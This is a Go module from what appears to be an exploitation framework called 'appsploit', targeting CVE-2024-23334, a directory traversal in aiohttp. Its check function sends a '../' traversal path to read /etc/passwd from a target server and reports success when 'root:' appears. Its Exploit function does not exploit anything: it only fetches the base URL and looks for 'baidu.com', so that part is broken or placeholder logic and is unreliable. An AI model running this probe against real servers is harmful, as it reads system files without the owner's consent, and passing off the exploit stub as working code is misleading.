package vul

import (
	"appsploit/pkg/utils"
	appVul "appsploit/pkg/vul"
	"fmt"
	"github.com/urfave/cli/v2"
	"strings"
)

type CVE_2024_23334 struct {
	appVul.BaseVulnerability
}

var CVE_2024_23334_v1 = &CVE_2024_23334{
	appVul.BaseVulnerability{
		Name:        "CVE-2024-23334",
		Description: "Aiohttp Directory Traversal",
	},
}

func (cve CVE_2024_23334) CheckSec(ctx *cli.Context) (bool, error) {
	errorData := error(nil)
	baseURL := utils.Http.FormatURL(ctx)
	target, errorData := utils.Http.FormatURLPath(baseURL, "static/../../../../../../../../../etc/passwd")
	if errorData != nil {
		fmt.Println("CheckSec Error: ", errorData)
		return false, errorData
	}
	resp, errorData := utils.Http.Get(target)
	if errorData != nil {
		return false, errorData
	}
	if strings.Contains(resp, "root:") {
		cve.VulnerabilityExists = true
	} else {
		cve.VulnerabilityExists = false
	}
	return cve.VulnerabilityExists, errorData
}

func (cve CVE_2024_23334) Exploit(ctx *cli.Context) (err error) {
	errorData := error(nil)
	baseURL := utils.Http.FormatURL(ctx)
	resp, err := utils.Http.Get(baseURL)
	if err != nil {
		return err
	}
	if strings.Contains(resp, "baidu.com") {
		fmt.Println("CVE-2024-23334 has exploited")
	} else {
		fmt.Println("CVE-2024-23334 is not exploitable")
	}

	return errorData
}
